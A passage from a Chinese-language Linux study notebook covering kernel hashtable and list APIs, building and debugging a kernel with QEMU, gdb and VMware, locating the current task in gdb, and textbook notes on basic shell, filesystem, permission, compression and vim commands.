hash_init(hashtable);
</code></pre>
<p>定义一个“存放”在hash_table中的节点。我的目的是建立一个<strong>从uid到level</strong>的映射，所以数据结构如下</p>
<pre><code class="language-c">struct level_hash {
	u32 uid;
    u32 level;
    struct hlist_node node;
};
</code></pre>
<p>然后就是如何增删改查的问题了。</p>
<ul>
<li>
<p>增：<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/hashtable.h#L55"><code>hash_add</code></a></p>
<pre><code class="language-c">/* 记得释放内存 */
struct level_hash *new =
    (struct level_hash *)kmalloc(sizeof(struct level_hash), GFP_KERNEL);
hash_add(htable, &amp;new-&gt;node, new-&gt;uid);
</code></pre>
</li>
<li>
<p>删：删除本身是<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/hashtable.h#L100"><code>hash_del</code></a>，我这里其实还带上了查找的过程。可能会删除的查找要用<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/hashtable.h#L200"><code>hash_for_each_possible_safe</code></a>。</p>
<pre><code class="language-c">hash_for_each_possible_safe(htable, plevel_hash, tmp, node,
                            newlevel_hash-&gt;uid) {
    if (plevel_hash-&gt;uid == newlevel_hash-&gt;uid) {
        hash_del(&amp;plevel_hash-&gt;node);
        kfree(plevel_hash);
        break;
    }
}
</code></pre>
</li>
<li>
<p>查：<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/hashtable.h#L160"><code>hash_for_each_possible</code></a>。其实，hash_table就是一堆哈希链表。我们插入一个节点，会根据key的哈希值选择一个哈希链表插进去。这样我们在查的时候，就根据key找到对应的链表，进行遍历查询。所以你的哈希够好，和数据规模差不多大，就可以让时间代价接近常数。</p>
<pre><code class="language-c">hash_for_each_possible(htable, plevel_hash, node, current_uid) {
    if (plevel_hash-&gt;uid == current_uid) {
        level = ptr-&gt;level;
        break;
    }
}
</code></pre>
</li>
</ul>
<h2 id="list"><a class="header" href="#list">list</a></h2>
<p>最简单的list的头文件定义<a href="https://elixir.bootlin.com/linux/v4.1/source">/</a><a href="https://elixir.bootlin.com/linux/v4.1/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/v4.1/source/include/linux/list.h">list.h</a>，他有很多的变种，比如plist, klist, llist, rculist等等。链表也是一个非侵入性的数据结构。5.16中我看到了以下这些链表。</p>
<div class="table-wrapper"><table><thead><tr><th>链表类型</th><th>头文件</th><th>说明</th></tr></thead><tbody>
<tr><td></td><td>freelist.h</td><td></td></tr>
<tr><td></td><td>klist.h</td><td></td></tr>
<tr><td>双向链表</td><td>list.h :star:</td><td>最基本简单的链表</td></tr>
<tr><td></td><td>llist.h</td><td></td></tr>
<tr><td></td><td>plist.h</td><td></td></tr>
<tr><td></td><td>rculist.h :star:</td><td></td></tr>
<tr><td></td><td>scatterlist.h</td><td></td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="调试linux内核环境搭建"><a class="header" href="#调试linux内核环境搭建">调试Linux内核环境搭建</a></h1>
<p>下面介绍的调试的总体思路有三个，需要的环境是一个Linux环境，最好是主机，虚拟机也行。假设你已经知道了gdb调试的基本原理。</p>
<ol>
<li>编译内核，用Qemu启动，用gdb调试。这还需要制作rootfs。这个需要过程(1,2,4)</li>
<li>编译内核，用VMware运行，用gdb调试。这个需要过程(6,7)，了解过程(1)。</li>
<li>下载已安装的内核版本的带调试信息的镜像，用gdb调试。这个需要过程(6,7)。</li>
</ol>
<pre><code class="language-sh">sudo apt install qemu-system-x86 gdb debootstrap\
	libncurses5-dev openssl libssl-dev build-essential pkg-config libc6-dev \
	bison flex libelf-dev zlibc minizip libidn11-dev libidn11
</code></pre>
<h2 id="1-内核编译"><a class="header" href="#1-内核编译">1. 内核编译</a></h2>
<p>首先，你需要下载内核的源代码。比如在<a href="https://kernel.org">https://kernel.org</a>中下载。你可以选择下载[tarball]，然后使用<code>tar -xfv xxx.tar.xz</code>命令进行解压。解压后进入源代码目录。</p>
<p>推荐使用下面的命令进行编译配置，使用字符图形界面来对整个系统进行裁剪。也有其他的选项，不过这个就挺好的。</p>
<pre><code class="language-sh">make menuconfig
</code></pre>
<ol>
<li><strong>开启调试选项: Kernel hacking -&gt; Compile time checks and compiler options -&gt; Compile kernel with debug info</strong>。这个默认好像就是开启的。</li>
<li><code>warn for stack frames larger than</code> 的数值，将其修改为4096（最好不要大过这个数值）</li>
<li>配置完成之后，保存在默认的.config文件就好了。需要注意的是，<strong>请在ext4文件系统</strong>下进行编译。否则会有意想不到的错误。</li>
</ol>
<p>然后进行编译，这需要一点时间。</p>
<pre><code>make -j$(nproc)
</code></pre>
<hr />
<p>我遇到的一些编译错误的处理，其实谷歌都会告诉你。</p>
<ul>
<li>如果遇到报错<code>make[1]: *** No rule to make target 'debian/canonical-certs.pem', needed by 'certs/x509_certificate_list'. Stop.</code>，编辑<code>.config</code>文件，修改<code>CONFIG_SYSTEM_TRUSTED_KEYS</code>，将其置空，重新make即可。</li>
<li>如果遇到报错<code>make[1]: *** No rule to make target 'debian/canonical-revoked-certs.pem', needed by 'certs/x509_revocation_list'.  Stop.</code>可以执行<code>scripts/config --disable SYSTEM_REVOCATION_KEYS</code></li>
</ul>
<h2 id="2-制作rootfs"><a class="header" href="#2-制作rootfs">2. 制作rootfs</a></h2>
<p>系统的启动是需要挂载rootfs的。我们使用debootstrap进行制作。</p>
<pre><code class="language-sh">qemu-img create rootfs.img 1G
mkfs.ext4 rootfs.img
# 切换到随便一个目录，/tmp也行
mkdir mnt
# 挂载image到mnt
sudo mount -o loop rootfs.img ./mnt/
sudo debootstrap bionic ./mnt/ #18.04
sudo debootstrap focal ./mnt/  #20.04
# 挂载一些必要的文件系统
sudo mount -t proc /proc ./mnt/proc
sudo mount --rbind /dev ./mnt/dev
sudo mount --rbind /sys ./mnt/sys
# 如果稍后安装软件的时候提示证书错误，把source.list里面的https改成http
sudo cp /etc/resolv.conf ./mnt/etc/resolv.conf
sudo cp /etc/apt/source.list ./mnt/etc/apt/source.list

sudo chroot ./mnt # 切换根目录
passwd root       # 修改root密码
apt update        # 看情况安装你需要的软件
apt install vim gcc make build-essential 

# 卸载image
sudo umount mnt
</code></pre>
<ul>
<li>文件系统是只读的，可以使用<code>mount -o remount /dev/sda /</code>修改成可读写的。</li>
<li>至今不知道Qemu中如何上网，只能从上面标记的部分挂载到主机上下载软件了。</li>
<li>如果要移动文件，只需要把他挂载到主机就可以了。</li>
<li><code>fsck.ext4 -y /dev/sda</code>，有时你把盘搞坏了可以修复一下。</li>
</ul>
<h2 id="3-运行"><a class="header" href="#3-运行">3. 运行</a></h2>
<p>使用qemu运行。</p>
<pre><code class="language-sh"># 启动qemu虚拟机
sudo qemu-system-x86_64 \
     -M pc \
     -hda rootfs.img \ # 制作的rootfs
     -kernel bzImage \ # 编译产生的Image, 在/boot/x64里面
     -append &quot;root=/dev/sda console=ttyS0&quot; \
     -nographic
</code></pre>
<h2 id="4-调试"><a class="header" href="#4-调试">4. 调试</a></h2>
<p>使用qemu+gdb进行调试。调试的时候添加选项<code>-append nokaslr</code>，这样子内核的布局就会和vmlinux一样，调试会方便很多很多很多。</p>
<pre><code class="language-sh"># 启动qemu虚拟机
sudo qemu-system-x86_64 \
     -M pc \
     -hda rootfs.img \
     -kernel bzImage \
     -append &quot;root=/dev/sda console=ttyS0 nokaslr&quot; \
     -nographic \
     -s -S
     
# 另一个例子
sudo qemu-system-aarch64 -M virt \
    -cpu max \
    -smp 2 \
    -m 512 \
    -kernel ./Image \
    -nographic \
    -append &quot;console=ttyAMA0 root=/dev/ram rdinit=/sbin/init nokaslr&quot; \ # 关闭 KASLR
    -initrd ./rootfs.cpio.gz\
        -fsdev local,security_model=passthrough,id=fsdev0,path=./share\
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -s 
</code></pre>
<p>启动gdb</p>
<pre><code class="language-shell">$ gdb
(gdb) file vmlinux
(gdb) target remote localhost:1234
</code></pre>
<h2 id="5-跨平台"><a class="header" href="#5-跨平台">5. 跨平台</a></h2>
<p>有时候，你可能需要跨平台编译和调试。这里假设环境是x64的Ubuntu，想要编译arm64的内核。首先安装跨平台的工具</p>
<pre><code class="language-shell">sudo apt install qemu-system-arm \        # qemu
         binutils-aarch64-linux-gnu \     # objdump等二进制工具
         gcc-8-aarch64-linux-gnu \        # gcc
         g++-8-aarch64-linux-gnu \        # g++ 这个编译内核并不是必须的
         gdb-multiarch                    # 多平台gdb
</code></pre>
<p>然后编译内核</p>
<pre><code class="language-shell">export ARCH=arm64
make CROSS_COMPILE=aarch64-linux-gnu- defconfig
make CROSS_COMPILE=aarch64-linux-gnu- menuconfig  # 启用 PA 支持（默认已开启）
make CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc)
</code></pre>
<h2 id="6-在虚拟机中运行自己编译的内核"><a class="header" href="#6-在虚拟机中运行自己编译的内核">6. 在虚拟机中运行自己编译的内核</a></h2>
<p>首先，你需要有一个虚拟机软件，比如VMware/VirtualBox。然后在上面跑着一个Linux系统，比如Ubuntu。接下去我们要做的是在上面编译内核，然后替换内核。</p>
<p>在前面源代码的基础上，我们复制主机的编译配置文件到源代码目录。之前提到通过make menuconfig进行编译配置，现在就不用了，不过也可以执行一下，进行配置。</p>
<pre><code class="language-shell">cd linux # 进入源代码目录
cp -v /boot/config-$(uname -r) .config
</code></pre>
<p>在虚拟机中当然也要安装必要的编译工具，在文章的开头有提到。</p>
<pre><code class="language-shell">make -j $(nproc) # 编译内核
sudo make modules_install # 安装模块
sudo make install # 安装内核
</code></pre>
<p>别忘了把编译生成的vmlinux文件拿出来，调试用。</p>
<p>更新grub config，重启。</p>
<pre><code class="language-shell">sudo update-initramfs -c -k 5.16.9
sudo update-grub
reboot
</code></pre>
<hr />
<p>另外，如果你只是为了学习一下Linux，而不是自己修改了一些文件必须重新编译内核，你也可以选择下载别人的编译结果，这非常方便。参考这篇<a href="https://wiki.ubuntu.com/Debug%20Symbol%20Packages#Getting_-dbgsym.ddeb_packages">Ubuntu Wiki</a>。</p>
<p>首先，我们通过下面的命令创建<code>/etc/apt/sources.list.d/ddebs.list</code>，更新列表。</p>
<pre><code class="language-shell">echo &quot;deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse&quot; | \
sudo tee -a /etc/apt/sources.list.d/ddebs.list
sudo apt install ubuntu-dbgsym-keyring
sudo apt-get update
</code></pre>
<p>然后可以下载带有调试信息的image。</p>
<pre><code>sudo apt-get install linux-image-`uname -r`-dbgsym
</code></pre>
<p>vmlinux在<code>/usr/lib/debug/boot/vmlinux-4.15.0-45-generic</code>，把他拿出来就可以调试了。</p>
<h2 id="7-利用vmware进行调试"><a class="header" href="#7-利用vmware进行调试">7. 利用VMWare进行调试</a></h2>
<p>修改虚拟机的vmx文件，添加下面这一行。显然，这是针对64位系统的。</p>
<pre><code>debugStub.listen.guest64 = &quot;TRUE&quot;
</code></pre>
<p>另外，我们应该关掉KASLR，否则调试会非常痛苦：修改<code>/etc/default/grub</code>文件，找到<code>GRUB_CMDLINE_LINUX_DEFAULT</code>然后添加在最后面添加<code>nokaslr</code>。然后更新grub，<code>sudo update-grub</code>。</p>
<p>然后当VM开机的时候8864端口就会开启，我们可以用gdb连接这个端口进行调试。</p>
<pre><code class="language-shell">$ gdb
(gdb) file vmlinux
(gdb) target remote localhost:8864
</code></pre>
<hr />
<p>https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html</p>
<p>https://xakcop.com/post/vmw-kernel-debugging/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="调试linux内核寻找current"><a class="header" href="#调试linux内核寻找current">调试Linux内核，寻找current</a></h1>
<p>在用gdb调试linux的时候，想获得current process的task_struct。但是</p>
<pre><code>gef➤  p current
No symbol &quot;current&quot; in current context.
</code></pre>
<p>原来在现在的内核上current不是一个全局变量了，在我调试的x86上，他是一个宏，如下</p>
<pre><code class="language-c">#define current get_current()
</code></pre>
<p>如果你给<code>get_current</code>打断点，那么你会打上几千个断点。因为它被inline了，所有用到的地方你都打了个断点。</p>
<p>所以我还是在某个地方打断点把，比如在<code>schedule</code>打个断点。</p>
<pre><code class="language-c">asmlinkage __visible void __sched schedule(void)
{
	struct task_struct *tsk = current;

	sched_submit_work(tsk);
	do {
		preempt_disable();
		__schedule(SM_NONE);
		sched_preempt_enable_no_resched();
	} while (need_resched());
	sched_update_worker(tsk);
}
EXPORT_SYMBOL(schedule);
</code></pre>
<p>所以<code>tsk</code>就是了？结果他被优化掉了。</p>
<p>查看那几千个地方<code>get_current</code>的汇编代码，找到了一点规律。下面的XXX寄存器就是<code>current</code>的地址。</p>
<pre><code class="language-asm">mov    XXX , QWORD PTR gs:0x1bbc0
</code></pre>
<p>XXX可能是任何寄存器，毕竟是函数内的，没有必要是rax。那么只需要下面这样，<code>current</code>不就来了吗</p>
<pre><code>gef➤  set $current=(struct task_struct*)$rbx
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linuxplay"><a class="header" href="#linuxplay">LinuxPlay</a></h1>
<p>介绍一下自己使用Linux碰到的一些东西。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux使用笔记"><a class="header" href="#linux使用笔记">Linux使用笔记</a></h1>
<p>——主要是看了鸟哥的书的笔记
——如果你记不住指令，也没关系。知道有执行这个功能的指令就好。
——其实我没有看完，实在是太多了。但是先就这样子吧。
——结合<code>Ctrl+F</code>食用</p>
<h2 id="鸟哥的读书笔记"><a class="header" href="#鸟哥的读书笔记">鸟哥的读书笔记</a></h2>
<h3 id="开机"><a class="header" href="#开机">开机</a></h3>
<p>BIOS：根据使用者的设定去指定的硬盘读取第一个扇区的MBR位置。
【主引导记录（MBR，Master Boot Record）是装有Linux系统的硬盘的第一个扇区，即C/H/S地址的0柱面0磁头1扇区，也叫做MBR扇区。】
BIOS-&gt;MBR-&gt;启动代码-&gt;核心文件（操作系统）
启动代码也可以装在各个分区的启动扇区。每个分区有自己的启动扇区，核心文件可以放在各个分区。
UEFI：</p>
<h3 id="挂载"><a class="header" href="#挂载">挂载</a></h3>
<p>挂载：利用一个目录当做进入点（挂载点），将磁盘分区的数据存放在该目录下。
根目录一定要挂载到某个分区。
还需要一个swap分区</p>
<h3 id="x-window和-console"><a class="header" href="#x-window和-console">X window和 console</a></h3>
<p>Ctrl+Alt+F1 X window模式
Ctrl+Alt+F2-6 console模式
以上分别是tty1,tty2...tty6,（可以认为tty=terminal)
所谓的X window模式，不过是在命令行模式下打开了图形界面。用startx命令即可。不过不要在已经有其他X window被启动的情况下用startx。
sudo systemctl disable lightdm	#取消开机进入图形模式，enable恢复</p>
<h3 id="一些键盘操作"><a class="header" href="#一些键盘操作">一些键盘操作</a></h3>
<p>TabTab		命令补全、文件补全
Ctrl+C		中断当前程序
Ctrl+D		EOF
如果文件名里有空格，用\ ，想换一行接着输命令，用<br />
;可以让你在一行输入好几个命令</p>
<p>man			查看manual			空格翻页，q退出，/string?string向下向上搜索，n,N正向反向。
info			在线求助				n下一个节点，p上一个节点，s搜索</p>
<h3 id="科学关机"><a class="header" href="#科学关机">科学关机</a></h3>
<p>who			查看当前用户在线状况
netstat		查看网络的联机状态
sync			把内存中尚未写入硬盘的数据写入硬盘中，shutdown前也会使用。sudo
shutdown	关机。sudo</p>
<h3 id="权限"><a class="header" href="#权限">权限</a></h3>
<p><strong>User，Group，Other</strong>，		万能的root
/etc/group		记录群组信息
/etc/shadow		记录用户密码
/etc/passwd		记录用户信息</p>
<h3 id="ls--l的显示详解"><a class="header" href="#ls--l的显示详解">ls -l的显示详解：</a></h3>
<p>1.第一栏的十个位	文件类型-User权限-Group权限-Other权限 
2.有多少档名连结到此节点（i-node）
3.表示文件（目录）的所有者账号
4.表示文件的所属群组
5.文件大小，默认单位byte
6.修改日期
7.文件名，带.的是隐藏文件
权限为----的，就是root才能用了，因为他不受权限限制
###改变文件属性和权限
chgrp		修改群组
chown		修改所有者,群组		chown User:Group filename
chmod		修改文件权限			chmod -R 755	AppImage	(-R表示递归的修改目录下的所有文件）
chmod u=rwx,g+r,o-r PPTX\ 演示文稿.pptx
###权限rwx，对文件来说读、写、执行
对于目录来说，分别为：能否看到该目录内容，能否修改该目录内容，能否进入该目录。一般开放的目录需要rx权限。
种类：
-：正规文件，纯文本，二进制文件，数据格式文件
d：目录（directory）
l：链接（link）
b：区块设备档（block）			在/dev目录下常见
c：字符设备文件（character）		在/dev目录下常见
s：资料接口文件（socket）		在/run或/tmp目录下常见
p：数据输送文件（pipe）
和文件扩展名没有任何关系，文件扩展名只是给人看的。
###默认权限
文件的默认权限为-rw-rw-rw,666.目录的默认权限为drwxrwxrwx,777.
当新建一个文件时，文件的权限要“减去”umask中的权限。（umask顾名思义就是掩码）
直接在umask后面输入数字即可修改
###文件的隐藏属性
chattr [+-=][ASacdistu] 文件或目录名称		：修改隐藏属性
+添加属性 -去除属性 =设定属性
i：让一个文件 不能被删除、改名、设定连结也无法写入或新增数据。只有 root 能设定。
a：文件将只能增加数据，而不能删除也不能修改数据，只有 root 才能设定这属性。
lsattr [adR] （文件或目录名称）	查看隐藏属性
###特殊权限（插眼，之后回来填坑）
当 s 这个标志出现在文件拥有者的 x 权限上时，例如刚刚提到的 /usr/bin/passwd 这个文件的权限状态：『-rwsr-xr-x』，此时就被称为 Set UID，简称为 SUID 的特殊权限。用于文件。
那么，其他用户在执行该文件的时候（要求其他用户对该文件有x权限），可以获得该程序拥有者的权限，在程序的执行过程中有效。
当 s 标志在文件拥有者的 x 项目为 SUID，那 s 在群组的 x 时则称为 Set GID，SGID
当t，SBIT，用于目录。
chmod 4755 filename	第一个数字就是上面三个特殊权限，依次为421.</p>
<h3 id="文件系统"><a class="header" href="#文件系统">文件系统</a></h3>
<p>根据FHS(filesystem hierarchy standard)
/根目录
/var			与系统运作有关
/usr			unix software resource与软件安装执行有关
/bin			可执行命令文件 
/boot		放置着系统核心文件和开机所需文件
/dev			系统设备（device）相关文件
/etc			系统主要配置文件
/home 		除了根用户外其他用户的家目录
/lib			系统和程序运行所要调用的库函数文件
/root		根用户家目录
/sbin		根用户才能执行的命令
/srv			服务启动后需要访问的数据
/tmp		程序临时储存目录，任何人都可访问
/opt			第三方软件建议安装目录
/media		移动设备相关文件
/lost+found	当文件系统发生错误时一些遗失的片段放置的目录，在deepin里也是回收站？
/proc		虚拟文件系统，内存信息
/sys			虚拟文件系统，记录核心与系统硬件信息相关的信息</p>
<p>#文件和目录
###相对路径：
.	当前目录
..	上级目录
~	当前用户的家目录</p>
<ul>
<li>前一个目录，就像windows中的后退</li>
</ul>
<p>Linux中文件的时间戳信息，主要有三个。第一个最重要。
mtime : modification time	文件的修改时间
ctime : status time			文件的权限、属性被更改时间
atime : access time			文件的读取时间
ls默认显示第一个mtime，查看下面两个加上选项--time=atime/ctime</p>
<h4 id="目录操作命令"><a class="header" href="#目录操作命令">目录操作命令：</a></h4>
<pre><code>cd		change directory切换目录
pwd		显示当前目录
mkdir	创建新的空目录
rmdir	删除空目录

ls		列出文件	-R递归列出子文件	-l详细信息
cp		复制（建立链接，更新文件）	-a完全复制，权限不变	-l创建硬链接	-s创建软链接 -r目录复制 
在默认情况下，会改变群组和权限
mv		移动目录，重命名	
mv source1 source2 ... destination, cp也一样
rm		移除文件		-r递归删除目录 -i删除前询问 -f强制删除，忽略不存在的文件

basename	路径中的档名
dirname		路径中的目录名
touch	改变文件时间戳，创建新文件	-a只修改atime -m只修改mtime -t修改成任意时间（默认为现在）
</code></pre>
<h4 id="文件读取命令"><a class="header" href="#文件读取命令">文件读取命令：</a></h4>
<pre><code>cat 		从第一行开始显示文件内容 -n显示行号
tac		从最后一行开始显示文件内容
nl		显示文件内容的时候输出行号
less		分页显示，比more好用
[Space][PgDown]向下翻页	[PgUp]向上翻页	/向下字符串搜索	？向上字符串搜索	q离开	
G最后一行	g第一行	n/N切换搜索结果
od		以二进制方式读取文件内容 	-t xCc：ASCII对照表
head	看文件头几行
tail		看文件末几行
head和tail可以配合使用，如查看11-20行：head -n 20 filename | tail -n 10
</code></pre>
<h4 id="文件操作命令"><a class="header" href="#文件操作命令">文件操作命令</a></h4>
<pre><code>grep		在输入中寻找匹配的字符(RE)，输出匹配的行		grep [option] pattern file1 file2 ...
cut		-d后面接分隔字符，与 -f 一起使用		-f依据-d的分隔字符将一段讯息分区成为数段，用 -f取出第几段
-c以字符 (characters) 的单位取出固定字符区，用于排列整齐的输出，比如ls -l | cut -c 1-10
sort		排序，默认为字典序。
uniq		对连续重复的条目去重计数
Note: 'uniq' does not detect repeated lines unless they are adjacent.
You may want to sort the input first, or use 'sort -u' without 'uniq'.
wc		对文件的行数、字数、字符数进行统计。

tr		进行字符的删除替换		tr ... old new	把...中的old换成new
tr ... -b old	删除...中的old
col		把tab换成对应个数的空格
split		把一个大文件拆成若干个小文件 	-b按大小拆分		-l按行数拆分		split [option] filename prefix
xargs	给命令提供参数，对于不能用Pipe的命令。
-n一次接受的最大参数	-p执行命令前询问
xargs [option] command ,然后从标准输入获得arguments	
printf	格式化输出，有点像C语言，但是分隔符是空格
awk		一个处理行数据的工具，会把file的行根据空白符拆分成字段，$1 $2 ...，$0代表整行
awk ‘条件表达式{指令} 条件表达式{指令}...’	filename		条件表达式为真会执行指令
diff		顾名思义，比较两个文本文件或目录的差异，逐行比较 	diff from-file to-file
-b忽略空白数不同的差异		-B忽略空白行的差异		-i忽略大小写的差异
cmp		比较两个文件的差异，逐字节比较
patch	更新指令，插眼
pr		打印准备指令、略
</code></pre>
<h4 id="文件信息和查找命令"><a class="header" href="#文件信息和查找命令">文件信息和查找命令</a></h4>
<pre><code>file		查看文件类型
which	查找脚本文件
whereis	在特定的目录下查找文件	-l列出特定的目录
locate	在系统的数据库中查找文件
deepin系统默认没有安装locate.
updatedb更新数据库
find		根据条件寻找文件，并可以对找到的结果执行action脚本。
find [PATH] [Option] [Action] 
例如：find -name 'DOC*' -exec ls -l {} \;		这里还有正则表达式
</code></pre>
<p>环境变量PATH，提供上下文</p>
<h1 id="磁盘管理这里头学问太深这里是皮毛中的尖尖"><a class="header" href="#磁盘管理这里头学问太深这里是皮毛中的尖尖">磁盘管理（这里头学问太深，这里是皮毛中的尖尖）</a></h1>
<p>对一块硬盘的操作流程：
1.对磁盘进行分区，建立可用的partition
2.对partion进行格式化，建立可用的file system
3.可以对刚刚建立的file system进行检验
4.在Linux系统中，把硬盘挂在到某个目录上
分区表格式：MBR/GPT
file system
Windows的操作系统使用NTFS文件系统。
Linux使用Ext2/3/4算是官方文件格式，除此之外/proc/filesystems可以查看已经被加载到内存中支持的文件系统。
当然还有很多其他的文件系统。</p>
<p>文件数据除了本身的内容之外，还包括很多属性。
在 Linux 系统下，每个文件(不管是一般文件还是目录文件)都会占用一个inode ， 且可依据文件内容的大小来分配多个 block 给该文件使用。
大致可以这么理解。
目录中的文件文件名存在目录对应的块中。
df：列出文件系统中的整体磁盘使用情况
du：列出文件的磁盘使用情况</p>
<p>硬链接：我们访问文件的方式是 通过文件名找到inode从而访问其内容。硬链接就是不同目录下的文件指向同一个inode的情况。可想而知，修改其中一个所有的都会改变，删除其中一个不影响其他的打开。不能链接目录，不能跨file system.
软链接：就像快捷方式。</p>
<p>lsblk		列出系统上所有的磁盘列表，以及信息。
blkid	也是查看磁盘信息的</p>
<p>磁盘分区：
对于分区表是MBR的使用fdisk分区，GPT的使用gdisk。
可以使用fdisk -l devicename 查看分区类型。
parted两者都可。
<strong>格式化</strong>建立file system：
mkfs		make file system,双击tab看看。
挂载：
mount	挂载命令	[设备名][挂载目录]	
也可以把目录挂载到目录上，--bind dir1 dir2，dir2是挂载点
umont	卸载命令
/etc/fstab中存储了开机挂载信息。六个字段分别为# Device Mount | point | filesystem | parameters | dump | fs
/etc/fstab 是开机时的配置文件，不过，实际 filesystem 的挂载是记录到 /etc/mtab 与 /proc/mounts 这两个文件当中的。每次我们在更动 filesystem 的挂载时，也会同时更动这两个文件喔！</p>
<p>关于Swap分区：
mkswap	格式化为swap格式
free		查看内存与swap使用情况
swapon	打开、查看swap分区对应的文件？设备？
swapoff	关闭某个打开的swap分区	这两个就像mount和umount</p>
<h1 id="压缩文件"><a class="header" href="#压缩文件">压缩文件</a></h1>
<p>虽然扩展名没什么用，Linux上常见的压缩文件一般用这些标示。
*.Z 		compress 程序压缩的文件；
*.zip 	zip 程序压缩的文件；
*.gz 		gzip 程序压缩的文件；
*.bz2 	bzip2 程序压缩的文件；
*.xz 		xz 程序压缩的文件；
*.tar 		tar 程序打包的数据，并没有压缩过；
*.tar.gz 	tar 程序打包的文件，其中并且经过 gzip 的压缩
*.tar.bz2 	tar 程序打包的文件，其中并且经过 bzip2 的压缩
<em>.tar.xz 	tar 程序打包的文件，其中并且经过 xz 的压缩
1.gzip
压缩文件之后，默认会产生</em>.gz的文件，并且源文件消失。
-1~9表示压缩等级		-d表示解压缩		-k表示源文件不消失		-v显示压缩信息</p>
<p>zcat		如果被压缩的是文本文件，可以考虑使用zcat读取
类似的还有zgrep , zless
2.bzip2
用法和gzip很像，默认产生.bz2文件，压缩比比gzip大
3.xz
用法依然很像，默认产生.xz文件，压缩比更大
相应的有xzcat , xzless , xzgrep
4.tar
这是打包指令，功能很强大，指令很多。
tar -cv -f filename.tar 要被打包的文件或目录名称				打包命令
tar -zcv -f filename.tar.gz 要被压缩的文件或目录名称			压缩命令
tar -ztv -f filename.tar.gz								查询命令
tar -zxv -f filename.tar.gz -C 欲解压缩的目录					解压缩命令
tar -zxv -f filename.tar.gz 要解压的文件名 -C 欲解压缩的目录	部分解压缩命令</p>
<p>上面的z表示压缩成.gz，换成j表示.bz2，换成J表示.xz
-p保留原来的权限设置，常用于备份配置文件
当已绝对路径指定文件时，tar会删除开头根目录/ -P可以保留路径的根目录
--exclude=filename 指定不打包的文件名
5.dd
dd if=”input file” of=”output file”
file除了可以是文件，也可以是装置
dd会单纯的记录磁盘的信息，所以和文件系统无关。
6.cpio
7.7z
.7z也是常见的压缩文件
7z x filename		解压缩</p>
<p>#vi和vim
vi有三个模式：
command mode：		按ESC进入			移动光标、复制粘贴、删除		一
insert mode：			在一般模式下i/a/o/r	进入，编辑					二
command-line mode：	在一般模式下按 : / ? 	进入，搜索、保存、退出等		三</p>
<p>基本操作：
三	:wq保存退出		:q!强制离开不保存		:w [filename]另存为
:r [filename]将filename里的内容添加到光标后面
一	hjkl 左下上右		[n]hjkl上下左右n个单位		gg回到第一行		[n]G到第[n]行
三	/word向下搜索word		?word向上搜索word	
:[n1],[n2]s/word1/word2	/g	在[n1]~[n2]之间搜索word1并替换成word2
:[n1],[n2]s/word1/word2	/g	在[n1]~[n2]之间搜索word1并替换成word2，替换前确认
x&lt;=&gt;delete	X&lt;=&gt;backspace
dd删除整行	[n]dd删除光标向下[n]行
yy复制整行	[n]yy复制光标向下[n]行
p将已经复制的数据粘贴到光标下一行	P将已经复制的数据粘贴到光标上一行
u撤销 		Ctrl+r取消撤销		.重复前一个指令
v字符选择	V行选择		Ctrl+V区块选择		然后结合ydp进行复制删除粘贴操作～
三	:sp {filename} 分窗口显示，没有filename就是当前文件
Ctrl+w+jk	上下切换窗口		Ctrl+w+q		退出窗口
三	:set xxx设定vim的环境</p>
<p>dos2unix		转换windows的换行格式为unix的换行格式
unix2dos		转换unix的换行格式为windows的换行格式
iconv		转换文件的编码格式 
iconv -f 原来的编码 -t 目标编码 文件 -o 输出文件</p>
<p>#Bash
bash是预设的shell，很好用。
一些功能：
双tab命令补全	历史命令记录↑
shell脚本
工作前景背景控制	
通配符 
history	历史命令记录 history 10 最近的10个历史记录
alias		设置命令别名 alias name=“指令” 		-p输出已经定义的别名
ulimit	限制用户对某些系统资源的使用
source	在当前shell中直接执行命令，让配置文件立即生效而不需要注销		source filename
stty		-a查看键盘快捷键对应的作用</p>
<p>一些默认的快捷键：
Ctrl + C 		终止目前的命令
Ctrl + D 		输入结束 (EOF)，例如邮件结束的时
Ctrl + S 		暂停屏幕的输出
Ctrl + Q 		恢复屏幕的输出
Ctrl + U 		在提示字符下，将整列命令删除
Ctrl + Z 		『暂停』目前的</p>
<p>login shell &amp; non-login shell:
tty1~tty6属于login shell，你需要先登录才能输入指令。
在X window下打开的bash窗口属于non-login shell，你不需要再次登录。</p>
<p>指令运行顺序：
1.以相对、绝对路径指明
2.用alias指明
3.bash的builtin内建指令
4.通过$PATH指明的路径寻找指令</p>
<p>一些bash中的变量：
HOME：代表用户家目录		LANG：代表当前系统语言	PATH：执行文件搜寻的目录
HISTSIZE：代表记录的历史命令最大值
?：上一次操作的返回值，0为正常		$：shell进程的PID</p>
<p>一些bash的配置文件：（插眼，现在还看不懂这些配置文件）
/etc/issue			保存bash的进站欢迎信息
/etc/profile		login shell会读取，会设定环境变量和呼叫其他配置文件
~/.bash_profile或~/.bash_login或~/.profile	
会依次读取三者中的一个，在我的电脑里是.profile。这是使用者的配置文件，也是login shell。
~/.bashrc			non-login shell会读取
~/.bash_logout	当我注销 bash 后，系统再帮我做完什么动作后才离开
~/.bash_history	记录历史指令</p>
<p>数据的重定向：
标准输入 (stdin) ：		代码为 0 		键盘
标准输出 (stdout)：		代码为 1 		屏幕
标准错误输出(stderr)：	代码为 2 		屏幕</p>
<pre><code>&gt;		覆盖重定向		
&gt;&gt;		累加重定向
&lt;		输入重定向
&lt;&lt;		指定字符作为eof
tee		将标准输入复制到每个指定文件，并显示到标准输出。 -a追加模式
</code></pre>
